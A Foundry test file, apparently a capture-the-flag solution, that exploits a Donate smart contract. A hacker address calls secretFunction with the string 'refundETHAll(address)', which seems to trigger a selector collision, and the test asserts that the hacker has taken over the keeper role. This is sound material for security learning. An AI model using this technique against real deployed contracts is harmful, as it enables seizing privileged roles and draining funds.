// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../src/donate.sol";

contract donateHack is Test {
    Donate donate;
    address keeper = makeAddr("keeper");
    address owner = makeAddr("owner");
    address hacker = makeAddr("hacker");

    function setUp() public {
        vm.prank(owner);
        donate = new Donate(keeper);
    }

    function testhack() public {
        vm.startPrank(hacker);

        // Hack Time
        console.log("Hacker address: ", hacker);
        console.log("Old keeper: ", donate.keeper());
        donate.secretFunction("refundETHAll(address)");
        console.log("New keeper: ", donate.keeper());

        // Verify if hacker is the keeper
        assertEq(donate.keeperCheck(), true);

        vm.stopPrank();
    }
}